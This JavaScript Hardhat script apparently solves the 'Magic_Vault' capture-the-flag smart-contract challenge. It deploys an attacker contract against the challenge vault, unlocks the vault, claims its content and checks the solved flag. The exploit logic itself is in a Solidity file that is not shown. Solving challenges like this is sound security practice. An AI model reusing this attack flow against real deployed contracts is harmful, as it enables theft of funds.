const hre = require("hardhat");
const { ethers, JsonRpcProvider } = require("ethers");

async function main() {

    const [deployer] = await hre.ethers.getSigners();

    const SETUP_ADDRESS = "0xed5a3ae0CB26Bcdb5AF7C7e1C2068B355ea06Ea9";

    // Get the contract instances
    const Setup = await hre.ethers.getContractFactory("contracts/Magic_Vault/Setup.sol:Setup");
    const setupInstance = Setup.attach(SETUP_ADDRESS);

    // Interact with the Setup contract
    const vaultAddress = await setupInstance.TARGET();
    console.log(`Target Vault Address: ${vaultAddress}`);

    // Assuming Creature ABI is available
    const Vault = await hre.ethers.getContractFactory("contracts/Magic_Vault/Vault.sol:Vault");
    const vaultInstance = Vault.attach(vaultAddress);

    //Attacker contract
    const AttackerContract = await hre.ethers.getContractFactory("contracts/Magic_Vault/Solution/Attack_Vault.sol:Attack_Vault");
    const attackerContractInstance = await AttackerContract.deploy(await vaultInstance.getAddress());

    // Deal damage and loot
    console.log("Before Unlocking: ", await vaultInstance.isUnlocked());
    await attackerContractInstance.attack(SETUP_ADDRESS);
    console.log("After Unlocking: ", await vaultInstance.isUnlocked());
    await vaultInstance.claimContent();
    console.log("After Claiming Content: ", await vaultInstance.mapHolder());
    
    // const solved = await setupInstance.isSolved();
     //console.log(solved)

     console.log(`isSolved?: ${await setupInstance.isSolved()}`);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });